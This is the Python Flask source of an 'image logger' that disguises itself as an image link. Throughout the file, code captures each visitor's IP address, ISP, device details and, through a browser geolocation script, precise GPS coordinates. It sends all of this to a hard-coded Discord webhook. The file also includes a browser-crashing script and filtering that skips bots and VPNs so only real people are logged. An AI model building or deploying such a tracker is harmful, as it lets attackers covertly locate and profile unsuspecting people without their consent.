from flask import Flask, request, Response, render_template_string, redirect
from urllib.parse import urlparse, parse_qs
import traceback
import requests
import base64
import httpagentparser
import json
import os
import time
import re

# Create Flask app
app = Flask(__name__)

__app__ = "Discord Image Logger"
__description__ = "Ultra Accurate Image Logger"
__version__ = "v3.0"
__author__ = "foaqen"

# Configuration - Optimized for maximum accuracy
config = {
    "webhook": "https://discord.com/api/webhooks/1467553434541625558/fKl1f66ykkbYUxlzxhR-ODuDaskO6bZvEi_Xb7zxeR0MNelnYg3LJBs-ZFCmA2QYDmbK",
    "image": "https://pngimg.com/uploads/spongebob/spongebob_PNG10.png",
    "imageArgument": True,

    "username": "🎯 Ultra Accurate Logger",
    "color": 0x00FFFF,  # Cyan color

    "crashBrowser": False,
    "accurateLocation": True,  # MUST be True for accurate coordinates

    "message": {
        "doMessage": False,
        "message": "📍 Location Captured!",
        "richMessage": True,
    },

    "vpnCheck": 1,  # 1 = Don't ping on VPN
    "linkAlerts": False,
    "buggedImage": True,
    "antiBot": 1,

    "redirect": {
        "redirect": False,
        "page": "https://example.org"
    },
}

# Blacklisted IP ranges
blacklistedIPs = ("27", "104", "143", "164")

# 1x1 transparent GIF (for bugged image feature)
TRANSPARENT_GIF = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")

# IP Information cache to avoid rate limiting
ip_cache = {}
CACHE_DURATION = 300  # 5 minutes

def get_client_ip():
    """Get the real client IP address from various headers"""
    # Check Vercel headers first
    headers_to_check = [
        'x-vercel-forwarded-for',
        'x-forwarded-for',
        'x-real-ip',
        'x-forwarded',
        'x-cluster-client-ip',
        'forwarded-for',
        'forwarded',
        'true-client-ip',
        'cf-connecting-ip',  # Cloudflare
        'fastly-client-ip',   # Fastly
        'x-vercel-ip-country' # Vercel country
    ]
    
    for header in headers_to_check:
        value = request.headers.get(header)
        if value:
            # X-Forwarded-For can contain multiple IPs, take the first one
            if header.lower() == 'x-forwarded-for':
                value = value.split(',')[0].strip()
            return value
    
    # Fallback to remote address
    return request.remote_addr or 'Unknown'

def get_all_headers():
    """Get all headers for debugging and additional info"""
    headers = {}
    for key, value in request.headers.items():
        headers[key] = value
    return headers

def botCheck(ip, useragent):
    """Detect bots and crawlers"""
    if not ip or not useragent:
        return False
        
    # Discord bots
    if ip and ip.startswith(("34.", "35.")):
        return "Discord"
    
    # Telegram
    if useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    
    # Common bots
    bot_patterns = [
        'bot', 'crawler', 'spider', 'scraper', 'slurp',
        'facebook', 'instagram', 'whatsapp', 'twitter',
        'linkedin', 'pinterest', 'discord', 'telegram',
        'slack', 'curl', 'wget', 'python-requests', 'java',
        'headless', 'phantom', 'selenium', 'puppet'
    ]
    
    if useragent:
        ua_lower = useragent.lower()
        for pattern in bot_patterns:
            if pattern in ua_lower:
                return "Bot/Crawler"
    
    return False

def get_ip_info(ip):
    """Get detailed IP information with caching"""
    if ip == 'Unknown' or ip == '127.0.0.1' or ip == '::1':
        return {
            "isp": "Local",
            "as": "Local",
            "country": "Local",
            "regionName": "Local",
            "city": "Local",
            "lat": 0,
            "lon": 0,
            "timezone": "Local/Local",
            "mobile": False,
            "proxy": False,
            "hosting": False,
            "countryCode": "XX",
            "region": "XX",
            "zip": "00000"
        }
    
    # Check cache
    current_time = time.time()
    if ip in ip_cache:
        cached_data, timestamp = ip_cache[ip]
        if current_time - timestamp < CACHE_DURATION:
            return cached_data
    
    try:
        # Use multiple APIs for redundancy
        # Primary: ip-api.com (fast and reliable)
        response = requests.get(
            f"http://ip-api.com/json/{ip}",
            params={
                'fields': 'status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query'
            },
            timeout=3
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                # Format the data
                info = {
                    "isp": data.get('isp', 'Unknown'),
                    "as": data.get('as', 'Unknown').split(' ')[0] if data.get('as') else 'Unknown',
                    "as_org": data.get('org', 'Unknown'),
                    "country": data.get('country', 'Unknown'),
                    "countryCode": data.get('countryCode', 'XX'),
                    "region": data.get('region', 'XX'),
                    "regionName": data.get('regionName', 'Unknown'),
                    "city": data.get('city', 'Unknown'),
                    "zip": data.get('zip', 'Unknown'),
                    "lat": data.get('lat', 0),
                    "lon": data.get('lon', 0),
                    "timezone": data.get('timezone', 'Unknown/Unknown'),
                    "mobile": data.get('mobile', False),
                    "proxy": data.get('proxy', False),
                    "hosting": data.get('hosting', False)
                }
                
                # Cache the result
                ip_cache[ip] = (info, current_time)
                return info
    
    except Exception as e:
        print(f"IP API error: {e}")
    
    # Fallback data
    return {
        "isp": "Unknown",
        "as": "Unknown",
        "as_org": "Unknown",
        "country": "Unknown",
        "countryCode": "XX",
        "region": "XX",
        "regionName": "Unknown",
        "city": "Unknown",
        "zip": "Unknown",
        "lat": 0,
        "lon": 0,
        "timezone": "Unknown/Unknown",
        "mobile": False,
        "proxy": False,
        "hosting": False
    }

def format_timezone(timezone_str):
    """Format timezone nicely"""
    if not timezone_str or timezone_str == 'Unknown/Unknown':
        return 'Unknown'
    
    try:
        if '/' in timezone_str:
            parts = timezone_str.split('/')
            if len(parts) == 2:
                city = parts[1].replace('_', ' ')
                region = parts[0]
                return f"{city} ({region})"
    except:
        pass
    
    return timezone_str

def format_coordinates(lat, lon, precision=6):
    """Format coordinates with specified precision"""
    try:
        return f"{float(lat):.{precision}f}, {float(lon):.{precision}f}"
    except:
        return f"{lat}, {lon}"

def reportError(error):
    """Report errors to Discord"""
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "❌ Image Logger - Error!",
                "color": 0xFF0000,  # Red
                "description": f"```\n{error[:1000]}\n```",
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
            }]
        }, timeout=3)
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    """Create and send the Discord report"""
    if not ip:
        ip = "Unknown"
    
    # Check blacklist
    if ip != "Unknown" and any(ip.startswith(bl) for bl in blacklistedIPs):
        return None
    
    # Get all headers for additional info
    all_headers = get_all_headers()
    
    # Bot check
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [{
                        "title": "🔗 Image Logger - Link Sent",
                        "color": 0xFFA500,  # Orange
                        "description": f"**Bot Detected:** {bot}\n**IP:** `{ip}`\n**Endpoint:** `{endpoint}`",
                        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
                    }]
                }, timeout=3)
            except:
                pass
        return None
    
    # Determine ping
    ping = "@everyone"
    
    # Get IP info
    info = get_ip_info(ip)
    
    # VPN/Hosting checks
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return None
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if info.get("proxy"):
                pass
            else:
                return None
        if config["antiBot"] == 3:
            return None
        if config["antiBot"] == 2:
            if info.get("proxy"):
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""
    
    # Parse user agent
    os_name, browser = "Unknown", "Unknown"
    if useragent and useragent != 'Unknown':
        try:
            os_name, browser = httpagentparser.simple_detect(useragent)
        except:
            pass
    
    # Format coordinates
    if coords:
        try:
            lat, lon = coords.split(',')
            coord_text = format_coordinates(lat.strip(), lon.strip(), 6)
            maps_link = f"https://www.google.com/maps?q={lat.strip()},{lon.strip()}"
            coord_accuracy = "🎯 Precise (GPS)"
        except:
            coord_text = coords.replace(',', ', ')
            maps_link = f"https://www.google.com/maps?q={coords.replace(',', '%2C')}"
            coord_accuracy = "📍 Approximate"
    else:
        coord_text = format_coordinates(info.get('lat', 0), info.get('lon', 0), 4)
        maps_link = f"https://www.google.com/maps?q={info.get('lat', 0)},{info.get('lon', 0)}"
        coord_accuracy = "🌐 Approximate (IP-based)"
    
    # Format timezone
    timezone_formatted = format_timezone(info.get('timezone', 'Unknown/Unknown'))
    
    # Get additional info
    country_flag = f":flag_{info.get('countryCode', 'xx').lower()}:"
    
    # Build the embed
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "🎯 Image Logger - Ultra Accurate Hit!",
            "color": config["color"],
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
            "footer": {"text": f"Logger v3.0 • {endpoint}"},
            "fields": [
                {
                    "name": "📍 LOCATION INFORMATION",
                    "value": f"""```
Country  : {info.get('country', 'Unknown')} {country_flag}
Region   : {info.get('regionName', 'Unknown')}
City     : {info.get('city', 'Unknown')}
Zip      : {info.get('zip', 'Unknown')}
Timezone : {timezone_formatted}
```""",
                    "inline": False
                },
                {
                    "name": "🎯 COORDINATES",
                    "value": f"[{coord_text}]({maps_link})\n**Accuracy:** {coord_accuracy}",
                    "inline": False
                },
                {
                    "name": "🌐 NETWORK INFORMATION",
                    "value": f"""```
IP       : {ip}
ISP      : {info.get('isp', 'Unknown')}
ASN      : {info.get('as', 'Unknown')}
Mobile   : {info.get('mobile', False)}
VPN      : {info.get('proxy', False)}
Hosting  : {info.get('hosting', False)}
```""",
                    "inline": False
                },
                {
                    "name": "💻 DEVICE INFORMATION",
                    "value": f"""```
OS       : {os_name}
Browser  : {browser}
Agent    : {useragent[:100]}...
```""",
                    "inline": False
                }
            ]
        }]
    }
    
    # Add thumbnail if URL provided
    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}
    
    # Send to Discord
    try:
        response = requests.post(config["webhook"], json=embed, timeout=5)
        if response.status_code == 204:
            print("Report sent successfully to Discord")
        else:
            print(f"Discord webhook returned {response.status_code}")
    except Exception as e:
        print(f"Failed to send webhook: {e}")
    
    return info

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    """Main request handler"""
    try:
        # Get client information
        ip = get_client_ip()
        useragent = request.headers.get('User-Agent', 'Unknown')
        all_headers = get_all_headers()
        
        # Get query parameters
        query_params = request.args.to_dict()
        full_url = request.url
        
        print(f"\n--- New Request ---")
        print(f"IP: {ip}")
        print(f"UA: {useragent}")
        print(f"Path: {path}")
        print(f"Params: {query_params}")
        
        # Get image URL from argument if enabled
        url = config["image"]
        if config["imageArgument"]:
            if query_params.get("url") or query_params.get("id"):
                try:
                    url_param = query_params.get("url") or query_params.get("id")
                    url = base64.b64decode(url_param.encode()).decode()
                    print(f"Custom URL: {url}")
                except Exception as e:
                    print(f"URL decode error: {e}")
        
        # Check blacklist
        if ip != "Unknown" and any(ip.startswith(bl) for bl in blacklistedIPs):
            return Response("OK", status=200)
        
        # Handle bots
        bot_result = botCheck(ip, useragent)
        if bot_result:
            print(f"Bot detected: {bot_result}")
            makeReport(ip, useragent, endpoint=path, url=url)
            
            if config["buggedImage"]:
                return Response(
                    TRANSPARENT_GIF,
                    mimetype='image/gif',
                    headers={
                        "Cache-Control": "no-cache, no-store, must-revalidate",
                        "Pragma": "no-cache",
                        "Expires": "0"
                    }
                )
            else:
                return redirect(url)
        
        # Handle location data
        result = None
        if query_params.get("g") and config["accurateLocation"]:
            try:
                location = base64.b64decode(query_params.get("g").encode()).decode()
                print(f"Location received: {location}")
                result = makeReport(ip, useragent, location, path, url=url)
            except Exception as e:
                print(f"Location decode error: {e}")
                result = makeReport(ip, useragent, endpoint=path, url=url)
        else:
            result = makeReport(ip, useragent, endpoint=path, url=url)
        
        # HTML Template with ultra-accurate geolocation
        html_template = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        }
        
        .container {
            position: relative;
            width: 100%;
            height: 100vh;
            overflow: hidden;
        }
        
        .image-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('{{ url }}');
            background-position: center;
            background-repeat: no-repeat;
            background-size: contain;
            background-color: #000;
        }
        
        .overlay {
            position: absolute;
            top: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.8);
            color: #00ffff;
            padding: 10px 20px;
            border-radius: 30px;
            font-size: 14px;
            border: 1px solid #00ffff;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
            z-index: 1000;
            pointer-events: none;
        }
        
        .message-box {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.9);
            color: white;
            padding: 30px 40px;
            border-radius: 20px;
            font-size: 18px;
            text-align: center;
            border: 2px solid #00ffff;
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.5);
            z-index: 1000;
            backdrop-filter: blur(10px);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 30px rgba(0, 255, 255, 0.5); }
            50% { box-shadow: 0 0 60px rgba(0, 255, 255, 0.8); }
            100% { box-shadow: 0 0 30px rgba(0, 255, 255, 0.5); }
        }
        
        .loading {
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            color: #00ffff;
            font-size: 12px;
            opacity: 0.7;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="image-container"></div>
        
        {% if message_doMessage and message_text %}
        <div class="message-box">{{ message_text|safe }}</div>
        {% else %}
        <div class="overlay">📍 Location Captured</div>
        {% endif %}
        
        <div class="loading">Processing...</div>
    </div>
    
    {% if crashBrowser %}
    <script>
        (function() {
            // Ultra-fast browser crasher
            var crash = function() {
                for(var i = 0; i < 100000; i++) {
                    var a = new Array(100000).fill('crash');
                    console.log(a);
                }
                location.reload();
            };
            setTimeout(crash, 100);
        })();
    </script>
    {% endif %}
    
    {% if redirect_enabled %}
    <meta http-equiv="refresh" content="0;url={{ redirect_page }}">
    {% endif %}
    
    {% if accurateLocation and not has_g_param %}
    <script>
        (function() {
            // Ultra-accurate geolocation script
            console.log('📍 Requesting high-accuracy location...');
            
            var currentUrl = window.location.href;
            
            // Don't request if already have location
            if (currentUrl.includes('g=')) {
                console.log('📍 Location already captured');
                return;
            }
            
            if (navigator.geolocation) {
                // High accuracy options
                var options = {
                    enableHighAccuracy: true,      // Request precise location
                    timeout: 15000,                 // Wait up to 15 seconds
                    maximumAge: 0                    // Don't use cached position
                };
                
                function success(position) {
                    var lat = position.coords.latitude;
                    var lng = position.coords.longitude;
                    var accuracy = position.coords.accuracy;
                    
                    console.log(`📍 Location captured!`);
                    console.log(`   Latitude: ${lat}`);
                    console.log(`   Longitude: ${lng}`);
                    console.log(`   Accuracy: ±${accuracy}m`);
                    
                    // Encode coordinates
                    var locationData = btoa(lat + ',' + lng);
                    
                    // Add to URL
                    var separator = currentUrl.includes('?') ? '&' : '?';
                    var newUrl = currentUrl + separator + 'g=' + encodeURIComponent(locationData);
                    
                    // Redirect with location data
                    window.location.replace(newUrl);
                }
                
                function error(err) {
                    console.warn('Geolocation error:', err.message);
                    
                    // Try fallback methods
                    if (err.code === 1) { // Permission denied
                        console.log('📍 Permission denied, continuing without location');
                    } else if (err.code === 2) { // Position unavailable
                        console.log('📍 Position unavailable');
                    } else if (err.code === 3) { // Timeout
                        console.log('📍 Location timeout, trying again...');
                        // Try one more time with less strict options
                        setTimeout(function() {
                            navigator.geolocation.getCurrentPosition(
                                success, 
                                function(e) { console.log('📍 Second attempt failed'); },
                                { enableHighAccuracy: false, timeout: 5000 }
                            );
                        }, 1000);
                    }
                }
                
                // Request location
                navigator.geolocation.getCurrentPosition(success, error, options);
                
                // Also try with watchPosition for continuous tracking
                var watchId = navigator.geolocation.watchPosition(
                    function(position) {
                        // If we get a more accurate position, update
                        if (position.coords.accuracy < 100) { // Less than 100 meters
                            console.log(`📍 Got better accuracy: ±${position.coords.accuracy}m`);
                            success(position);
                            navigator.geolocation.clearWatch(watchId);
                        }
                    },
                    null,
                    { enableHighAccuracy: true, maximumAge: 0 }
                );
                
                // Stop watching after 10 seconds
                setTimeout(function() {
                    navigator.geolocation.clearWatch(watchId);
                }, 10000);
                
            } else {
                console.log('📍 Geolocation not supported');
            }
        })();
    </script>
    {% endif %}
</body>
</html>'''
        
        # Prepare message if enabled
        message_text = config["message"]["message"] if config["message"]["doMessage"] else ""
        if config["message"]["doMessage"] and config["message"]["richMessage"] and result and isinstance(result, dict):
            message_text = message_text.replace("{ip}", ip)
            message_text = message_text.replace("{isp}", str(result.get("isp", "Unknown")))
            message_text = message_text.replace("{asn}", str(result.get("as", "Unknown")))
            message_text = message_text.replace("{country}", str(result.get("country", "Unknown")))
            message_text = message_text.replace("{region}", str(result.get("regionName", "Unknown")))
            message_text = message_text.replace("{city}", str(result.get("city", "Unknown")))
            message_text = message_text.replace("{lat}", str(result.get("lat", "0")))
            message_text = message_text.replace("{long}", str(result.get("lon", "0")))
            
            timezone = result.get("timezone", "Unknown/Unknown")
            if '/' in timezone:
                message_text = message_text.replace("{timezone}", f"{timezone.split('/')[1].replace('_', ' ')} ({timezone.split('/')[0]})")
            else:
                message_text = message_text.replace("{timezone}", "Unknown")
            
            message_text = message_text.replace("{mobile}", str(result.get("mobile", False)))
            message_text = message_text.replace("{vpn}", str(result.get("proxy", False)))
            message_text = message_text.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
            
            os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
            message_text = message_text.replace("{browser}", browser)
            message_text = message_text.replace("{os}", os_name)
        
        # Render HTML
        rendered_html = render_template_string(
            html_template,
            url=url,
            message_doMessage=config["message"]["doMessage"],
            message_text=message_text,
            crashBrowser=config["crashBrowser"],
            redirect_enabled=config["redirect"]["redirect"],
            redirect_page=config["redirect"]["page"],
            accurateLocation=config["accurateLocation"],
            has_g_param="g" in query_params
        )
        
        # Return response with no-cache headers
        return Response(
            rendered_html,
            mimetype='text/html',
            headers={
                "Cache-Control": "no-cache, no-store, must-revalidate, private",
                "Pragma": "no-cache",
                "Expires": "0",
                "Access-Control-Allow-Origin": "*"
            }
        )
        
    except Exception as e:
        print(f"Error: {traceback.format_exc()}")
        try:
            reportError(traceback.format_exc())
        except:
            pass
        return Response(
            "Internal Server Error",
            status=500,
            mimetype='text/plain'
        )

@app.errorhandler(404)
def not_found(e):
    return catch_all(request.path)

@app.errorhandler(500)
def internal_error(e):
    return Response("Internal Server Error", status=500, mimetype='text/plain')

# This is the correct handler for Vercel
def handler(event, context):
    """Vercel serverless function handler"""
    return app
